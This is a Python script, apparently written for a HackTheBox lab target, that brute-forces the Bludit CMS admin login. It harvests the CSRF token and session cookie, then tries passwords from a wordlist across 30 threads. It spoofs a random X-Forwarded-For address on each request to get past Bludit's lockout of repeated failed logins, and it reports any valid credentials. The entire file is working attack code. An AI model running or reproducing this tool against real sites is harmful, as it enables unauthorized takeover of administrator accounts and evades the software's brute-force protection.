#!/usr/bin/env python3

import os
import random
from re import search as research
from http import client
from time import sleep
import itertools
import threading


# this program was tested only in bludit v3.9.2

server = "10.10.10.191"
port = 80
path = "/admin/login"  # Path of the bludit login
check = False  # set true to check bludit version
# user and pass can be a simple word or a path to a dictionary
# warning: using large files can freeze your box. Experience talking
userwordlist = "admin"
passwordlist = "/home/th3g3ntl3man/.github/misRepo/hackthebox/wordlist.txt"

threads = 30  # Elevated use of threads may need a greather timeout
timeout = 30


wordlistpair = [userwordlist, passwordlist]
for i in range(2):
    if os.path.isfile(wordlistpair[i]):
        wordlistpair[i] = open(wordlistpair[i], 'r').read()
    userwordlist = wordlistpair[0].split("\n")
    passwordlist = wordlistpair[1].split("\n")
del wordlistpair


def random_ip_generator():
    return "{}.{}.{}.{}".format(random.randint(10,255), random.randint(10,255), \
                                random.randint(10,255), random.randint(10,255))

def get_cookie_N_token(HTTPHandler, head:dict, path):
    """ return cookie and token from the page """
    HTTPHandler.request("GET",path,headers=head)
    response = HTTPHandler.getresponse()
    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',response.read().decode()).group(1)
    cookie = research('BLUDIT-KEY=[a-zA-Z0-9]*',response.getheader('Set-Cookie')).group(0)
    return token,cookie


def POST_request(HTTPHandler, head:dict, data, path):
    """ try to loging, if sucess return true, else return token to keep trying"""
    HTTPHandler.request("POST",path,body=data,headers=head)
    response = HTTPHandler.getresponse()
    info = response.read().decode()
    token = research('input.+?name="tokenCSRF".+?value="(.+?)"',info).group(1)
    if research("Username or password incorrect",info) == None:
        return True
    else:
        return token

    
def MainFunction(username,passwordlist,server,port=80,timeout=10,path="/admin/login"):    
    HTTPHandler = client.HTTPConnection(server,port,timeout)
    HTTPHandler.connect()
    header = {
        "Host":server,
        "User-Agent":"GoogleBot",
        "Connection":"keep-alive"
    }
    token,cookie = get_cookie_N_token(HTTPHandler,header,path)
    for password in passwordlist:
        bodydata="tokenCSRF={}&username={}&password={}&save=".format(token,username,password)    
        header = {
            "Host":server,
            "User-Agent":"GoogleBot",
            "X-Forwarded-For":random_ip_generator(),
            "Content-Type":"application/x-www-form-urlencoded",
            "Content-Length":"{}".format(len(bodydata)),
            "DNT":"1",
            "Connection":"close",
            "Cookie":cookie,
        }
        print("[*] Threads [%03d], Trying: %20s:%-20s"%(threading.active_count(),username,password),end="\r")
        try:
            token = POST_request(HTTPHandler,header,bodydata,path)
        except:
            print("\n[*] Error: {}:{}".format(username,password))
            break
            
        if token == True:
            print("\n[!] FOUND: %-20s:%20s"%(username,password))
            exit()
    HTTPHandler.close()

pswdict = dict()
aux1 = aux2 = aux3 = 0
width = (len(passwordlist)-1)//threads
for i in itertools.count(width,width):  # dividing pass wordlist per threads
    if i >= (len(passwordlist)-1):
        i = i-(i-(len(passwordlist)-1))
        aux3 = 1
    pswdict[aux1] = passwordlist[aux2:i]
    aux1 += 1
    aux2 = i
    if aux3 == 1:
        break
del aux1,aux2,aux3,width    

for user in userwordlist:
    for pswr in pswdict.keys():
        x = threading.Thread(target=MainFunction, args=(user,pswdict[pswr],server,port,timeout,path))
        x.start()
    while threading.active_count() > 1:
        sleep(3)
        
print("\n[*] Finished...")
